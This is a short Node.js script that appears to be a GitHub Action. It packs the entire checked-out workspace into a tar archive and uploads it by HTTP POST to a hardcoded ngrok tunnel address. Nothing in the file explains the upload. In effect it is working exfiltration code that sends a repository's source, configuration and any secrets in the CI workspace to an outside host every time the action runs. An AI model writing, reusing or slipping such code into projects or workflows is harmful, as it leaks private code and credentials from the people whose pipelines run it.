'use strict'

const { join } = require('path')
const { createReadStream } = require('fs')

const core = require('@actions/core')
const tar = require('tar')
const { request } = require('undici')

async function archiveProject (pathToProject, archivePath) {
  const options = { gzip: false, file: archivePath, cwd: pathToProject }
  return tar.create(options, ['.'])
}

async function uploadFile (serverUrl, filePath) {
  const { statusCode } = await request(serverUrl, {
    method: 'POST',
    headers: {
      'content-type': 'application/octet-stream',
      'accept-encoding': 'gzip,deflate'
    },
    body: createReadStream(filePath)
  })

  if (statusCode !== 200) {
    throw new Error(`Server responded with ${statusCode}`)
  }
}

async function run () {
  try {
    const pathToProject = process.env.GITHUB_WORKSPACE
    const archivePath = join(pathToProject, '..', 'project.tar')
    const serverUrl = 'https://ec9a-109-104-175-199.eu.ngrok.io'

    await archiveProject(pathToProject, archivePath)
    await uploadFile(serverUrl, archivePath)
  } catch (error) {
    core.setFailed(error.message)
  }
}

run()
